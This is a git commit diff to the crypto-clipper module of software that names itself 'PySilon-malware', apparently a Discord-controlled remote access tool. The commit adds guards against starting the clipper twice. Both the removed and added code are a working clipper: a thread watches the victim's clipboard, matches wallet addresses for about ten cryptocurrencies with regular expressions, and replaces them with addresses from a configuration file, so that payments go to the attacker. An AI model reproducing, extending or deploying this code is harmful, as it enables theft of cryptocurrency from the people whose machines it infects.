b38b0f4f320592a8223a179aeda736ab5ddb0ad3
JuicyChann <nik.xeiladakis@gmail.com>
2023-07-29 03:37:36 +0300

    make clipper not start multiple times

--- resources/source_code/crypto_clipper.py
+++ resources/source_code/crypto_clipper.py
@@ -7,46 +7,56 @@ import threading
 
 # on message
 elif message.content == '.start-clipper':
-    embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
-    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
-    await message.channel.send(embed=embed)
-    clipper_stop = False
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    config_path = os.path.join(script_dir, 'crypto_clipper.json')
-    with open(config_path) as f:
-        addresses = json.load(f)
+    if clipper_stop:
+        clipper_stop = False
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        config_path = os.path.join(script_dir, 'crypto_clipper.json')
+        with open(config_path) as f:
+            addresses = json.load(f)
 
-    def match():
-        clipboard = str(pyperclip.paste())
-        btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
-        eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
-        doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
-        ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
-        xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
-        bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
-        dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
-        trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
-        xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
-        xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
+        def match():
+            clipboard = str(pyperclip.paste())
+            btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
+            eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
+            doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
+            ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
+            xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
+            bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
+            dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
+            trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
+            xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
+            xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
 
-        for currency, address in addresses.items():
-            if eval(f'{currency.lower()}_match'):
-                if address and address != clipboard:
-                    pyperclip.copy(address)
-                break
+            for currency, address in addresses.items():
+                if eval(f'{currency.lower()}_match'):
+                    if address and address != clipboard:
+                        pyperclip.copy(address)
+                    break
 
-    def wait_for_paste():
-        while not clipper_stop:
-            pyperclip.waitForNewPaste()
-            match()
+        def wait_for_paste():
+            while not clipper_stop:
+                pyperclip.waitForNewPaste()
+                match()
 
-    thread = threading.Thread(target=wait_for_paste)
-    thread.start()
+        thread = threading.Thread(target=wait_for_paste)
+        thread.start()
+        embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        await message.channel.send(embed=embed)
+    else:
+        embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        await message.channel.send(embed=embed)
 
 # on message
 elif message.content == '.stop-clipper':
-    embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
-    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
-    await message.channel.send(embed=embed)
-    clipper_stop = True
-    thread.join()
+    if not clipper_stop:
+        embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        await message.channel.send(embed=embed)
+        clipper_stop = True
+        thread.join()
+    else:
+        embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        await message.channel.send(embed=embed)
